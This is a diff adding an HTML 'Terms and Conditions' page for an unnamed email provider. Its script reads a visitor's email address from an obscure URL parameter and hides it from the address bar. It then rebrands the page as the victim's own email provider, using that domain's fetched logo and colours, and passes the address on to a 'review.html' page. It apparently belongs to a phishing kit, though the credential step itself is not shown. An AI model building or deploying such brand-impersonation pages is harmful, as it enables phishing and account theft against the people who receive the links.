@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Terms and Conditions</title>
+
+<!-- Dynamic favicon -->
+<link id="dynamicFavicon" rel="icon" href="">
+
+<style>
+    body { font-family: Arial, sans-serif; background: #f9f9f9; margin: 0; padding: 0; }
+    .container { max-width: 900px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .logo { width: 96px; height: 96px; display: block; margin: 0 auto 30px auto; border-radius: 15px; object-fit: contain; }
+    h1, h2 { color: #222; }
+    h1 { text-align: center; margin-bottom: 30px; }
+    h2 { margin-top: 35px; }
+    p, li { line-height: 1.6; }
+    ul { margin-left: 20px; }
+    .accept-btn { display: block; width: 250px; margin: 40px auto; padding: 15px; background: #28a745; border: none; color: white; font-size: 18px; border-radius: 8px; cursor: pointer; }
+    .accept-btn:hover { opacity: 0.9; }
+    .footer { text-align: center; margin-top: 40px; color: #777; font-size: 13px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Dynamic Logo -->
+    <img id="dynamicLogo" class="logo" src="" alt="Logo">
+
+    <h1 id="companyNameHeader">Terms and Conditions</h1>
+    <p><strong>Effective Date:</strong> 10/12/2025</p>
+
+    <p id="introText">
+        These Terms and Conditions (“Terms”) govern your access to and use of the email services,
+        applications, websites, and related features (collectively, the “Service”) provided by
+        <strong id="companyName">[Email Provider Name]</strong> (“Company,” “we,” “our,” or “us”). By creating an account,
+        accessing, or using the Service, you agree to be bound by these Terms. If you do not agree, do not use the Service.
+    </p>
+
+    <!-- Example Terms -->
+    <h2>1. Eligibility</h2>
+    <p>To use the Service, you must:</p>
+    <ul>
+        <li>Be at least 16 years old or the age of digital consent in your jurisdiction.</li>
+        <li>Have the legal capacity to enter into a binding agreement.</li>
+        <li>Not be prohibited by applicable laws from using the Service.</li>
+    </ul>
+
+    <h2>2. Account Registration</h2>
+    <ul>
+        <li>You must provide accurate, current, and complete information.</li>
+        <li>You are responsible for safeguarding your password.</li>
+        <li>You must promptly update your account information if it changes.</li>
+    </ul>
+
+    <h2>3. Our Service Do Not Accept</h2>
+    <ul>
+        <li>Send spam, bulk unsolicited messages, or engage in phishing.</li>
+        <li>Use the Service to distribute malware, viruses, or harmful code.</li>
+        <li>Use automated systems (bots, scripts, crawlers) to access the Service without permission.</li>
+        <li>Use the Service to harass, threaten, or impersonate others.</li>
+        <li>Interfere with or disrupt the integrity or performance of the Service.</li>
+        <li>Access or search the Service by any means other than our publicly supported interfaces.</li>
+        <li>Illegal, harmful, or abusive activities.</li>
+        <li>Intellectual property infringement.</li>
+        <li>Sending deceptive emails or using misleading headers.</li>
+        <li>Hosting or linking to illegal content.</li>
+        <li>Excessive use of server resources beyond reasonable limits.</li>
+    </ul>
+
+    <h2>4. Privacy and Data Protection</h2>
+    <ul>
+        <li>What information we collect</li>
+        <li>How we use and protect your data</li>
+        <li>How long we retain data</li>
+        <li>How you can access, correct, or delete your information</li>
+    </ul>
+
+    <h2>5. Email Storage and Retention</h2>
+    <p>The Service may include limitations on mailbox size, message storage, and attachment formats. You are responsible for backing up important messages.</p>
+
+    <h2>6. Service Availability</h2>
+    <p>We strive to maintain reliable service but do not guarantee uninterrupted operation. We are not liable for data loss, outages, or delays beyond our control.</p>
+
+    <h2>7. Third-Party Integrations</h2>
+    <p>We are not responsible for third-party services or privacy practices. Integrations are used at your own risk.</p>
+
+    <h2>8. Intellectual Property</h2>
+    <p>All intellectual property is owned by the Company or its licensors. You may not copy, distribute, reverse-engineer, or use trademarks without permission.</p>
+
+    <h2>9. Fees and Payment (If Applicable)</h2>
+    <p>Fees are billed on a recurring basis unless canceled. Payments are non-refundable except where required by law.</p>
+
+    <h2>10. Termination</h2>
+    <p>We may suspend or terminate your account for policy violations, suspicious activity, or as required by law. Rights and obligations survive termination.</p>
+
+    <h2>11. Disclaimer of Warranties</h2>
+    <p>The Service is provided “as is” without warranties of any kind. No guarantee of email delivery, uptime, or virus-free operation.</p>
+
+    <h2>12. Limitation of Liability</h2>
+    <p>The Company is not liable for indirect, incidental, or consequential damages. Total liability is limited to the amount paid in the 12 months preceding a claim.</p>
+
+    <h2>13. Indemnification</h2>
+    <p>You agree to indemnify the Company from claims arising from your use of the Service, violations of these Terms, or misuse.</p>
+
+    <h2>14. Changes to the Terms</h2>
+    <p>We may update these Terms. Continued use constitutes acceptance of the new Terms.</p>
+
+    <h2>15. Contact Information</h2>
+    <p>
+        <strong id="companyNameFooter">[Email Provider Name]</strong><br>
+        Email: <span id="companyEmail">[Insert Support Email]</span><br>
+        Website: <span id="companyWebsite">[Insert Website URL]</span>
+    </p>
+
+    <button class="accept-btn" id="acceptBtn">Accept Terms</button>
+
+    <div class="footer">© <span id="companyNameFooter2">[Email Provider Name]</span> <span id="year">2025</span>. All Rights Reserved.</div>
+</div>
+
+<script>
+(async function(){
+
+    function capitalize(str){ return str.charAt(0).toUpperCase() + str.slice(1); }
+
+    const params = new URLSearchParams(window.location.search);
+    let email = params.get("bazz505");
+    if(email) email = decodeURIComponent(email.trim());
+
+    history.replaceState({}, document.title, window.location.pathname);
+
+    let domain = "example.com";
+    if(email && email.includes("@")) domain = email.split("@")[1].toLowerCase();
+
+    const companyName = capitalize(domain.split(".")[0]);
+    const supportEmail = `support@${domain}`;
+    const websiteURL = `https://www.${domain}`;
+
+    document.getElementById("companyName").textContent = companyName;
+    document.getElementById("companyNameHeader").textContent = `Terms and Conditions for ${companyName}`;
+    document.getElementById("companyNameFooter").textContent = companyName;
+    document.getElementById("companyNameFooter2").textContent = companyName;
+    if(document.getElementById("companyEmail")) document.getElementById("companyEmail").textContent = supportEmail;
+    if(document.getElementById("companyWebsite")) document.getElementById("companyWebsite").textContent = websiteURL;
+
+    const logoEl = document.getElementById("dynamicLogo");
+    const faviconEl = document.getElementById("dynamicFavicon");
+
+    const logoSources = [
+      `https://logo.clearbit.com/${domain}?size=256`,
+      `https://favicon.vemetric.com/${domain}?size=128`,
+      `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
+      `https://icons.duckduckgo.com/ip3/${domain}.ico`,
+      `https://api.faviconkit.com/${domain}/128`
+    ];
+
+    let idx = 0;
+function tryNext() {
+    if (idx >= logoSources.length) {
+        logoEl.remove(); // remove logo if nothing fetched
+        faviconEl.href = "";
+        return;
+    }
+    fetch(logoSources[idx++])
+    .then(res => { if(!res.ok) throw "bad"; return res.blob(); })
+    .then(blob => {
+        if(blob.size < 1500) throw "too small";
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            logoEl.src = reader.result; // set logo src
+            faviconEl.href = reader.result;
+
+            // Wait for image to load before computing colors
+            logoEl.onload = () => {
+                const avgColor = getAverageColor(logoEl);
+                const acceptBtn = document.getElementById("acceptBtn");
+                acceptBtn.style.backgroundColor = avgColor;
+
+                const rgb = avgColor.match(/\d+/g).map(Number);
+                const brightness = (r,g,b)=>(r*299+g*587+b*114)/1000;
+                acceptBtn.style.color = brightness(rgb[0],rgb[1],rgb[2]) > 128 ? '#000':'#fff';
+                document.querySelector(".container").style.borderTop = `10px solid ${avgColor}`;
+            };
+        };
+        reader.readAsDataURL(blob);
+    })
+    .catch(tryNext);
+}
+
+
+    function getAverageColor(imgEl){
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = imgEl.naturalWidth;
+      canvas.height = imgEl.naturalHeight;
+      ctx.drawImage(imgEl,0,0);
+      const data = ctx.getImageData(0,0,canvas.width,canvas.height).data;
+      let r=0,g=0,b=0,count=0;
+      for(let i=0;i<data.length;i+=4){ r+=data[i]; g+=data[i+1]; b+=data[i+2]; count++; }
+      r=Math.round(r/count); g=Math.round(g/count); b=Math.round(b/count);
+      return `rgb(${r},${g},${b})`;
+    }
+
+    tryNext();
+
+    document.getElementById("acceptBtn").addEventListener("click", ()=>{
+        let targetURL = "review.html";
+        if(email) targetURL += `?bazz505=${encodeURIComponent(email)}`;
+        window.location.href = targetURL;
+    });
+
+})();
+</script>
+
+</body>
+</html>
